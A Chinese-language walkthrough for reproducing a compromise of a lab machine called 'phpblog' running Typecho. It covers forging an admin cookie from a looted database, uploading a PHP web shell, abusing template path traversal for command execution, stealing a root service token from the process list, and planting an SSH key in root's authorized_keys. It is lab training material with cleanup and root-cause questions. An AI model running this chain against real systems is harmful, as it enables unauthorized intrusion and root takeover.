# phpblog 复现指导

这份文档面向“已经知道结论，准备照着做一遍”的复现，不再要求自己从头猜测入口。
目标是让每一步都有明确的成功判据，并知道失败时先检查什么。

> 如果看不懂“为什么执行这条命令”，先读
> [复现原理详解.md](复现原理详解.md)。它用“操作者 → 请求 → 服务端 → 权限变化”的方式逐步解释。

执行位置说明：

- “Kali”：在攻击机终端执行；
- “通过 Web Shell”：命令实际在 phpblog 上以 `momo` 身份执行；
- “root shell”：先登录 root，再在靶机内部执行。

文档中的 `/path/to/...` 和 `<TOKEN>` 是占位符，需要替换成你的真实路径和当前 token，
不要把尖括号原样复制进命令。

## 0. 开始前

- 只在自己拥有或明确授权的靶场上操作。
- 先保留干净快照或关机备份。
- Kali 使用 `NAT + Host-only`，phpblog 使用 Host-only。
- 下文默认靶机地址为 `192.168.56.101`，实际地址不同时整体替换。

建议先在 Kali 中开一个记录终端：

```bash
script -a ~/phpblog-run.log
```

## 1. 启动与连通性（Kali）

确认靶机能访问：

```bash
ping -c 2 192.168.56.101
curl -sSI http://192.168.56.101/
```

成功判据：

```text
HTTP/1.1 200 OK
Server: Apache/2.4.68 (Debian)
X-Powered-By: PHP/8.4.24
```

如果失败，先检查 VirtualBox Host-only 网卡、靶机网卡和 IP，不要继续测 Web 漏洞。

## 2. 确认攻击面（Kali）

```bash
nmap -sC -sV -p22,80 192.168.56.101
curl -sS http://192.168.56.101/ | grep -E 'generator|submit|changelog'
```

应当确认：

```text
22/tcp OpenSSH
80/tcp Apache / Typecho 1.3.0
/usr/themes/classic-22/submit/
/usr/themes/classic-22/docs/changelog.md
```

## 3. 准备管理员会话（Kali）

项目已经保存了离线提取的数据库：

```text
04_loot/blog.sqlite
```

使用脚本生成 Typecho Cookie：

```bash
cd /path/to/2026-W45_LAB-phpblog/02_exploit

COOKIE=$(python3 forge_typecho_cookie.py \
  ../04_loot/blog.sqlite \
  http://192.168.56.101)

curl -sS -b "$COOKIE" \
  http://192.168.56.101/admin/ |
  grep '<title>'
```

成功判据：

```text
网站概要 - 折页手记 - Powered by Typecho
```

如果仍是登录页：

1. 检查 `base_url` 是否与当前访问地址完全一致。
2. 检查 `blog.sqlite` 是否来自同一台靶机。
3. 检查数据库中的 `typecho_users.authCode` 是否非空。
4. 不要先尝试长时间爆破 phpass 密码。

## 4. 恢复低权限入口（Kali 发起，靶机内执行）

### 4.1 上传 shell（Kali 发起）

先确认 [phpblog_shell.php](02_exploit/phpblog_shell.php) 存在。提交：

```bash
curl -sS \
  -F 'draft=@phpblog_shell.php;filename=shell.php;type=application/x-php' \
  http://192.168.56.101/usr/themes/classic-22/submit/
```

成功判据：

```text
投稿已收到：shell.php
```

### 4.2 页面模板指向上传文件（浏览器或 Kali 发起）

当前靶场已经存在页面 `audit-template`，其模板值应为：

```text
../../../../../../tmp/submissions/shell.php
```

直接访问：

```bash
curl -sS \
  'http://192.168.56.101/index.php/audit-template.html?cmd=id'
```

成功判据：

```text
PHPBLOG_RCE
uid=1000(momo) gid=1000(momo) groups=1000(momo)
```

如果没有该页面，在恢复管理员会话后：

1. 打开 `http://192.168.56.101/admin/write-page.php`。
2. 标题和 slug 均可填写 `audit-template`。
3. 正文随意填写。
4. 用 Burp 或浏览器开发者工具拦截发布请求。
5. 将表单参数 `template` 改为 `../../../../../../tmp/submissions/shell.php`。
6. 发布后访问 `index.php/audit-template.html?cmd=id`。

不要只通过网页下拉框寻找模板：表单服务端不校验这个值，关键动作在原始 POST 请求中。

## 5. 读取 root 服务 token（通过 Web Shell）

通过刚拿到的 Web shell 查询进程：

```bash
curl -sS --get \
  'http://192.168.56.101/index.php/audit-template.html' \
  --data-urlencode "cmd=ps -eo user,pid,args | grep '[b]logbackup'"
```

应看到类似：

```text
root ... /opt/blogbackup/agent.py --token <TOKEN> --listen 127.0.0.1:9001
```

把 `<TOKEN>` 记录下来。每次重启服务后 token 可能变化，复现前要重新读取。

验证接口：

```bash
curl -sS --get \
  'http://192.168.56.101/index.php/audit-template.html' \
  --data-urlencode "cmd=curl -sS 'http://127.0.0.1:9001/status?token=<TOKEN>'"
```

成功判据：

```json
{"service":"blogbackup","jobs":["daily-www"]}
```

## 6. 利用备份恢复服务提权（Kali 发起，靶机内恢复）

### 6.1 准备公钥（Kali）

先检查 `.ssh` 目录。正常的目录权限应为 `700`：

```bash
ls -la ~/.ssh
```

如果目录中只有 `known_hosts`、`agent`，没有 `id_ed25519` 或 `.pub` 文件，说明密钥尚未生成。
推荐为这台靶机使用专用密钥，而不是覆盖系统默认密钥：

```bash
mkdir -p ~/.ssh
chmod 700 ~/.ssh

KEY="$HOME/.ssh/phpblog_lab_ed25519"

if [[ ! -f "$KEY" ]]; then
  ssh-keygen -t ed25519 -a 100 -C "phpblog-lab" -f "$KEY" -N ''
fi

if [[ ! -f "$KEY.pub" ]]; then
  ssh-keygen -y -f "$KEY" > "$KEY.pub"
fi

chmod 600 "$KEY"
chmod 644 "$KEY.pub"
ls -l "$KEY" "$KEY.pub"
ssh-keygen -lf "$KEY.pub"
```

成功时 `ssh-keygen` 会输出类似：

```text
256 SHA256:... phpblog-lab (ED25519)
```

`known_hosts` 只记录服务器指纹，`agent` 只是 SSH agent 的运行目录，它们都不是可用于认证的
密钥对。私钥 `phpblog_lab_ed25519` 只保存在 Kali，不能提交到 Git 或发送给靶机；
`phpblog_lab_ed25519.pub` 才是要交给恢复服务的公钥。

### 6.2 一键提交（Kali）

```bash
cd /path/to/2026-W45_LAB-phpblog/02_exploit/privesc

bash exploit_blogbackup.sh \
  'http://192.168.56.101/index.php/audit-template.html' \
  '<TOKEN>' \
  ~/.ssh/phpblog_lab_ed25519.pub
```

期望响应：

```json
{"ok":true,"id":"audit-root-key","dest":"/root/.ssh/authorized_keys"}
```

如果 public key 为空，脚本会直接报错并退出。

### 6.3 登录 root（Kali）

```bash
ssh -o StrictHostKeyChecking=no \
  -i ~/.ssh/phpblog_lab_ed25519 \
  root@192.168.56.101 \
  'id; cat /root/7e934684eafe9fe6f1c32d6b06207c7f.txt'
```

成功判据：

```text
uid=0(root) gid=0(root) groups=0(root)
flag{root-7e934684eafe9fe6f1c32d6b06207c7f}
```

## 7. 清理（root shell）

复现结束后至少完成以下清理：

```bash
rm -f /var/lib/blogbackup/jobs/audit-root-key.json
rm -f /var/lib/blogbackup/staging/audit-root-key
rm -f /tmp/submissions/shell.php
```

`/root/.ssh/authorized_keys` 不能简单删除。先恢复测试前的内容，或者直接回滚到干净快照。
本次取证运行前已经保存了原始文件，清理时应恢复原内容后再验证自己的 root 公钥不再生效。

如果回滚快照，确认：

```bash
systemctl is-active blogbackup.service
ls -la /var/lib/blogbackup/jobs /var/lib/blogbackup/staging
```

## 8. 失败排查

| 现象 | 优先检查 |
|---|---|
| 上传没有回显 | 当前页面是否是 `submit/index.php`，字段名是否为 `draft` |
| 页面仍显示正常内容 | `/tmp/submissions/shell.php` 是否还在；模板路径是否恰好多一个 `../` |
| 页面 404 | 页面 slug、页面是否发布、Typecho 路由是否正常 |
| `blogbackup` 返回 401 | token 是否从当前 PID 重新读取 |
| restore 返回 400 | job JSON、staging 路径、目标是否在 allowlist |
| SSH 仍被拒绝 | 公钥是否真的非空、authorized_keys 是否被验证，root SSH 是否允许 key |
| 页面执行 `momo` 但没有 root | 不要继续找内核 exp，优先检查高权限服务与可写目录 |

## 9. 复现完成后的学习检查

能够回答以下问题，才算真正理解这台机器：

1. 为什么 `/tmp` 不在 Web 根目录，PHP 仍然可以执行上传文件？
2. 为什么仅校验“目标路径在 allowlist 内”仍然不够安全？
3. 如果只能修复一行代码，应该先修页面模板校验还是先改上传目录？
4. 如果要在固件里找同类漏洞，应先搜索哪些函数名和参数名？

建议把答案写进 `REPORT.md` 的根因与 IoT 映射部分，而不是只保留 flag。
